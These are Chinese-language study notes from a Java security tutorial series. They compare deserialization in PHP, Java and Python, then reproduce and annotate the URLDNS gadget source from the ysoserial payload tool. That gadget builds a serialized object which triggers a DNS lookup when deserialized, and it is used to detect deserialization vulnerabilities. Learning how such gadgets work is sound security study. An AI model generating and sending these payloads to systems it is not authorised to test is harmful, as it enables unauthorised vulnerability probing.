## [Java安全漫谈 - 07.不同语言中的反序列化漏洞](https://t.zsxq.com/NF2NfQf)

### 何为序列化和反序列化

序列化: 在网络上传输的数据按照特定的格式转换为二进制数据

反序列化: 将二进制数据转换回来



`反序列化漏洞`是对一类漏洞的泛指，而不是专指某种反序
列化方法导致的漏洞，比如`Jackson反序列化漏洞`和`Java readObject`造成的反序列化漏洞就是完全不同的两种漏洞。

---

### Java序列化更深入的原因

 `writeObject `允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用` readObject `进行读取。

### PHP,JAVA,Python反序列化的区别

**1. PHP**

PHP的序列化是开发者不能参与的，开发者调用 serialize 函数后，序列化的数据就已经完成了，你得到的是一个完整的对象，你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其 `__sleep` 、`__wakeup`魔术方法的目的就是在序列化、反序列化的前后执行一些操作。



**2.Java**

Java在序列化时一个对象，将会调用这个对象中的 `writeObject `方法，参数类型是
`ObjectOutputStream `，开发者可以将任何内容写入这个stream中；反序列化时，会调用`readObject `，开发者也可以从中读取出前面写入的内容，并进行处理。

`writeObject`方法会先调用`ObjectOutputStream`中的`defaultWriteObject()`方法，该方法会执行默认的序列化机制。然后才是`writeObject`

代码:

```md
private void writeObject(java.io.ObjectOutputStream s) throws
IOException {
    s.defaultWriteObject();
    s.writeObject("This is a object");
 }
```

使用工具解析序列化数据 https://github.com/NickstaDB/SerializationDumper

会发现我们写入的字符串 `This is a object` 被放在 `objectAnnotation` 的位置

**3.Python(危害最高)**

Python的反序列化过程实际上是在执行一个基于栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。

---

## [Java安全漫谈 - 08.认识最简单的Gadget——URLDNS](https://t.zsxq.com/ieMZBQj)

**注意:此处需要实操,具体请百度 URLDNS，跟着别人做一遍**

### 名词解释:

**Gadget**: 链子,指的是 从触发位置开始到执⾏行行命令的位置结束

**CC**:  `CommonsCollections`, Java中应用广泛的一个库

**ysoserial**: CC链利用的一个著名工具



### URLDNS源码——选自ysoserial

**试着阅读英文，机翻可能更看不懂，不会的单词就查**

```java
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); // The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered [是hashCode的计算操作触发了DNS请求。]

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

       /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```

